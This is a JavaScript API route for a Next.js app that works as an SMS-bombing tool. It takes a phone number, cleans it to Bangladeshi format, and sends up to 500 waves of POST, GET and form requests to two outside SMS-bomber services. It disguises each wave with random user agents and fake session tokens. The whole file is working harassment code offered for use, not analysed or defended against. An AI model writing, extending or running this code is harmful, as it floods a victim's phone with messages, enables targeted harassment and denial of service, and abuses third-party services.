// pages/api/attack.js

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  let { number, amount, isUltimate } = req.body;

  // 1. Strict Number Cleaning
  let cleanNumber = number.toString().replace(/\D/g, ''); 
  if (cleanNumber.startsWith('88')) cleanNumber = cleanNumber.substring(2);
  if (cleanNumber.length > 11) cleanNumber = cleanNumber.substring(0, 11);

  // 2. Target Endpoints (Direct API Simulation)
  const targetLinks = [
    'https://nuke-sms-bomber.pages.dev/',
    'https://shadowx-sms-bomber.onrender.com/'
  ];

  const runAttack = async () => {
    const totalWaves = isUltimate ? 500 : amount; 
    const delay = isUltimate ? 400 : 1200; 

    for (let i = 0; i < totalWaves; i++) {
      // Protibar ekta alada 'Identity' create korbo
      const randomUA = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E1'
      ][Math.floor(Math.random() * 3)];

      const attackPromises = targetLinks.map(async (baseUrl) => {
        try {
          // --- METHOD 1: POST with JSON (Modern API) ---
          const postPayload = async () => {
            await fetch(baseUrl, {
              method: 'POST',
              headers: { 
                'Content-Type': 'application/json',
                'Accept': 'application/json, text/plain, */*',
                'User-Agent': randomUA,
                'Origin': baseUrl,
                'Referer': baseUrl,
                'X-Requested-With': 'XMLHttpRequest',
                'X-App-Version': '1.0.0',
                'X-Session-ID': Math.random().toString(36).substring(7)
              },
              body: JSON.stringify({
                number: cleanNumber,
                phone: cleanNumber,
                target: cleanNumber,
                amount: 1,
                country: "BD",
                service: "whatsapp",
                msg: "Attack",
                token: Math.random().toString(36).substring(7)
              }),
              mode: 'no-cors'
            });
          };

          // --- METHOD 2: GET with Query Params (URL Injection) ---
          const getPayload = async () => {
            const url = `${baseUrl}?number=${cleanNumber}&amount=1&country=BD&service=whatsapp&phone=${cleanNumber}&target=${cleanNumber}&token=${Math.random().toString(36).substring(7)}`;
            await fetch(url, {
              method: 'GET',
              mode: 'no-cors',
              headers: { 'User-Agent': randomUA }
            });
          };

          // --- METHOD 3: Form Data (Legacy API) ---
          const formDataPayload = async () => {
            const fd = new URLSearchParams();
            fd.append('number', cleanNumber);
            fd.append('amount', '1');
            fd.append('country', 'BD');
            fd.append('service', 'whatsapp');

            await fetch(baseUrl, {
              method: 'POST',
              headers: { 
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': randomUA,
                'Origin': baseUrl,
                'Referer': baseUrl,
              },
              body: fd.toString(),
              mode: 'no-cors'
            });
          };

          // Ekhon sob method eksathe run korbo (Parallel Attack)
          await Promise.all([postPayload(), getPayload(), formDataPayload()]);

        } catch (err) {
          console.error(`[Wave ${i}] Error: ${err.message}`);
        }
      });

      await Promise.all(attackPromises);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  };

  runAttack();

  return res.status(200).json({ 
    success: true, 
    message: isUltimate ? "GOD MODE ACTIVATED! 🚀" : "ATTACK IN PROGRESS! 🔥" 
  });
}
